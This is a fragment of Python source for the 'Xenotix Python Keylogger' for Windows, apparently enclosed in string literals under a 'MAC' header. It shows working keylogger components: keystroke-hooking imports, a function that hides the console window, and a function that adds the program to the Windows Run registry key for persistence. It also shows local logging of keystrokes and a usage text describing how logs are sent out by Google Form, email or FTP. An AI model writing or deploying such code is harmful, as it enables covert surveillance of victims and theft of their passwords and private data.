"""MAC"""




























"""
WINDOWS:
try:
    import pythoncom, pyHook
except:
    print "Please Install pythoncom and pyHook modules"
    exit(0)
import os
import sys
import threading
import urllib,urllib2
import smtplib
import ftplib
import datetime,time
import win32event, win32api, winerror
from _winreg import *

#Disallowing Multiple Instance
mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    print "Multiple Instance not Allowed"
    exit(0)
x=''
data=''
count=0

#Hide Console
def hide():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

def msg():
    print \n \nXenotix Python Keylogger for Windows
Coder: Ajin Abraham <ajin25@gmail.com>
OPENSECURITY.IN
usage:xenotix_python_logger.py mode [optional:startup]
mode:
     local: store the logs in a file [keylogs.txt]

     remote: send the logs to a Google Form. You must specify the Form URL and Field Name in the script.

     email: send the logs to an email. You must specify (SERVER,PORT,USERNAME,PASSWORD,TO).

     ftp: upload logs file to an FTP account. You must specify (SERVER,USERNAME,PASSWORD,SSL OPTION,OUTPUT DIRECTORY).
[optional] startup: This will add the keylogger to windows startup.\n\n
    return True

# Add to startup
def addStartup():
    fp=os.path.dirname(os.path.realpath(__file__))
    file_name=sys.argv[0].split("\\")[-1]
    new_file_path=fp+"\\"+file_name
    keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'

    key2change= OpenKey(HKEY_CURRENT_USER,
    keyVal,0,KEY_ALL_ACCESS)

    SetValueEx(key2change, "Xenotix Keylogger",0,REG_SZ, new_file_path)

#Local Keylogger
def local():
    global data
    if len(data)>100:
        fp=open("keylogs.txt","a")
        fp.write(data)
        fp.close()
        data=''
    return True
"""
